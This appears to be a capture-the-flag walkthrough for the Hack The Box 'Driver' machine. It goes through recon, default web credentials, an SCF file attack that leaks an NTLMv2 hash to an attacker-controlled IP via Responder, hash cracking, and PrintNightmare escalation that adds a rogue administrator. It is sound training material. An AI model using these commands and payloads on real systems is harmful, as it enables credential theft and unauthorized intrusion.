# Driver
## Reconnaissance
## Run the NmapAutomator on the target machine
```bash
sudo ./nmapAutomator.sh 10.10.11.106 All
```
* From the result, some open ports and information about the open ports is given.

![1_nmap](https://user-images.githubusercontent.com/53956303/165389835-90189666-6291-43fc-bf55-d1fb33d7f4b7.jpg)
## Enumeration
## Port 5985
* Nothing special found from the port 5985.
## port 135
* Since there has RPC running on port 135, run `rpcdump.py` to get some information.
```bash
python3 /opt/impacket/exmples/rpcdump.py 10.10.11.106 | grep MS-RPRN
```
* From the result, a protocol name is given.

![5_rpcdump](https://user-images.githubusercontent.com/53956303/165389947-31d1692e-4a1d-48f0-be1e-74a32d7ef1ce.jpg)
## Port 80
* The web page on port 80 requires credentials to access.

![2_HTTP](https://user-images.githubusercontent.com/53956303/165389864-c23807a4-cc9b-4eea-8ef0-b1eec5457104.jpg)
* However, using a default credentials `admin:admin`, the access is granted.

![3_access](https://user-images.githubusercontent.com/53956303/165389889-cc74f082-622f-4896-992d-75e3d89f83cc.jpg)
* Save the host name obtained from the web page at `/etc/hosts`.

![4_hosts](https://user-images.githubusercontent.com/53956303/165389907-caefc967-9283-4e52-8c75-91769aec3572.jpg)
## Exploitation; SMB Share - SCF File Attacks
### Enumerate the web server for a vulnerable point to attack
* From the Firmware updates tab, a message mentioned about a "file share". Also, from the reconnaissance, a SMB share is found, it might be the share for the uploaded file.
    * They also mentioned that they review the uploaded file manually, so if an attacker can upload a file to get some response from the target, it can be useful.

![7_upload](https://user-images.githubusercontent.com/53956303/165389980-b8675674-a03a-4628-805c-426f2088b112.jpg)

### SMB share - SCF File Attacks
|[SMB share - SCF File Attacks - Penetration Testing Lab](https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/)|
|----|
* from the "Penetration Testing Lab", a SMB exploit to obtain password hash of domain users or Meterpreter shells is found.
#### 1. Creat a vulnarble SCF file
* Save this script as `@test.scf`. SCF file will make the file to be executed when the user will browse the file. Adding the @ symbol in front of the filename will place the file on the top of the share drive
```scf
[Shell]
Command=2
IconFile=\\10.10.14.7\share\test.ico
[Taskbar]
Command=ToggleDesktop
```
![8_file](https://user-images.githubusercontent.com/53956303/165390003-734808b9-48ab-42b7-92af-c8796292b2b5.jpg)
#### 2. Make a Responder listening
```bash
responder -w --lm -v -I tun0
```
#### 3. Upload the malicious SCF file and wait until the admin on the web server browse the file.
* As a result, a NTLMv2 hash is given on the Responder.

![9](https://user-images.githubusercontent.com/53956303/165390123-2eed8c5f-16e1-46db-9854-1143b76e0f7a.png)
#### 4. Crack the hash using John the ripper
```bash
sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
* From the result, the password for "Tony" is given in plain text.

![10_pass](https://user-images.githubusercontent.com/53956303/165390175-5fe5b0e3-6c95-4901-93ba-a2d95400ccf4.jpg)
### Access the target machine using Evil-winrm
```bash
evil-winrm -i driver.htb -u tony -p <PASSWORD>
```
* As a result, a shell as "driver\tony" is opened.

![11_shell](https://user-images.githubusercontent.com/53956303/165390200-ab1c7cd1-37b7-4dd1-929b-9f733db600b5.jpg)
## Privilege Escalation
### Upload the WinPEAS on the target machine
```bash
# Use the evil-winrm's upload function
upload /home/kali/Desktop/tools/winPEAS/winPEASx64.exe
```
![12_winpea](https://user-images.githubusercontent.com/53956303/165390226-4af0300f-5083-401d-a947-65ab70455d33.jpg)
* From the result of the WinPEAS, a suspicious service `spoolsv` is found.

![13_sppolsv](https://user-images.githubusercontent.com/53956303/165390250-4c201eef-0163-41ba-945a-7e0f2620d452.jpg)
### Spoolsv.exe
* From Google search, Spoolsv.exe runs the Windows OS printer spooler service.

![14_spool](https://user-images.githubusercontent.com/53956303/165390265-a02aa19d-b2dc-49d5-b68e-339ed62b7280.jpg)
## CVE-2021-1675 - PrintNightmare LPE (Powershell) - Spoolsv.exe
|[CVE-2021-1675 - PrintNightmare LPE (Powershell) - GitHub:  calebstewart ](https://github.com/calebstewart/CVE-2021-1675)|
|----|
### 1. Upload the malicious PS1 file to the target machine
```bash
# Use the Evil-winrm's upload functionality
upload /home/kali/Desktop/tools/CVE-2021-1675.ps1
```
### 2. Enable the running script permission on Evil-winrm
```bash
set-ExecutionPolicy RemoteSigned -Scope CurrentUser
```
### 3. Use the module to add a new user to the local administrator group
```bash
Import-module .\cve-2021-1675.ps1
Invoke-Nightmare -DriverName "Xerox" -NewUser "Pado" -NewPassword "root"
```
* As a result, a new user is made.

![15_executed](https://user-images.githubusercontent.com/53956303/165390301-b626cd30-8768-46f1-b5b0-303ffbc142e0.jpg)
* The newly created user is in the Administrators group.

![16_pado](https://user-images.githubusercontent.com/53956303/165390323-98b00d98-c8c6-4cd1-9e62-ca3d1a813064.jpg)
### Connect the target machine using Evil-winrm as a Newly created Admin account
```bash
evil-winrm -i 10.10.11.106 -u Pado -p root
```
* As a result, an Admin shell is open.

![17_root](https://user-images.githubusercontent.com/53956303/165390359-dcd0e3fd-f178-478c-9dc9-1ea2a91c0934.jpg)
